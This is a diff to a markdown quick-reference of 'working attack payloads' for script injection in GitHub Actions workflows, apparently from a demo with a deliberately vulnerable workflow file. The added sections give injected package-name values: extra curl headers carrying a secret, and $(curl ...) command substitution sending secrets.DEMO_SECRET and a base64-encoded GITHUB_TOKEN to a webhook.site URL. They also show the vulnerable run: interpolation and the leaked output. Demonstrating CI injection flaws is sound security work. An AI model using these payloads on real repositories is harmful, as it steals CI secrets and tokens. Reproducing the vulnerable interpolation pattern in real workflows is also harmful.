@@ -12,25 +12,63 @@ Quick reference for testing the vulnerability with corrected attack vectors base
 
 ## Working Attack Payloads
 
-### 1. Command Substitution (WORKS on direct interpolation)
+### 1. Direct Secret Exfiltration (WORKS - Most Dangerous)
 
-**Target:** `vulnerable.yml`
+**Target:** `vulnerable.yml` - Pattern 6 (Send notification step)
 
 **Package name:**
 ```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
+test" -H "X-Stolen-Token: ${{ secrets.DEMO_SECRET }}" -H "X-Fake:
+```
+
+**Package version:**
+```
+1.0.0
+```
+
+**Expected result:**
+- ✅ The curl command includes an additional header with the secret
+- ✅ Secret sent directly to the endpoint in HTTP headers
+- ✅ Demonstrates that secrets used directly in `run:` are vulnerable
+
+**Why it's critical:** When `${{ secrets.SECRET }}` is used directly in a `run:` command alongside untrusted input, an attacker can inject additional shell code that references the same secret **at workflow generation time**. The secret becomes part of the script text itself.
+
+**Workflow code that's vulnerable:**
+```yaml
+run: |
+  curl -X POST "https://hooks.example.com/notify" \
+    -H "Authorization: Bearer ${{ secrets.DEMO_SECRET }}" \
+    -d "package=${{ inputs.package_name }}"
+```
+
+**Generated shell script becomes:**
+```bash
+curl -X POST "https://hooks.example.com/notify" \
+  -H "Authorization: Bearer super-secret-api-key-12345" \
+  -d "package=test" -H "X-Stolen-Token: super-secret-api-key-12345" -H "X-Fake:"
+```
+
+---
+
+### 2. Command Substitution with Secret Reference (WORKS)
+
+**Target:** `vulnerable.yml` - Any step with direct interpolation
+
+**Package name:**
+```
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?token=${{ secrets.DEMO_SECRET }})
 ```
 
 **Expected result:**
 - ✅ Curl executes (see progress output in logs)
-- ✅ Webhook receives GET request with secret parameter
-- ✅ Proves direct `${{ }}` interpolation is exploitable
+- ✅ Webhook receives GET request with secret in query parameter
+- ✅ Proves direct `${{ }}` interpolation allows secret exfiltration
 
-**Why it works:** GitHub Actions generates the shell command with `$(...)` in it, and the shell executes command substitution before passing the result to git.
+**Why it works:** GitHub Actions generates the shell command with both the input AND the secret expanded at workflow generation time. The `$(...)` causes command substitution, and the secret reference is also expanded, putting the actual secret value into the curl command.
 
 ---
 
-### 2. Variable Expansion Secret Leak (WORKS on vulnerable workflow)
+### 3. Variable Expansion Secret Leak (WORKS on vulnerable workflow)
 
 **Target:** `vulnerable.yml`
 
@@ -52,7 +90,7 @@ fatal: 'update-leaked-super-secret-api-key-12345-1.0.0' is not a valid branch na
 
 ---
 
-### 3. GitHub Token Exfiltration (WORKS on direct interpolation)
+### 4. GitHub Token Exfiltration (WORKS on direct interpolation)
 
 **Target:** `vulnerable.yml`
 
@@ -66,7 +104,7 @@ $(curl https://webhook.site/YOUR-WEBHOOK-ID/token-$(echo $GITHUB_TOKEN | base64 
 
 ---
 
-### 4. Multi-Command with File Storage (WORKS on direct interpolation)
+### 5. Multi-Command with File Storage (WORKS on direct interpolation)
 
 **Target:** `vulnerable.yml`
 
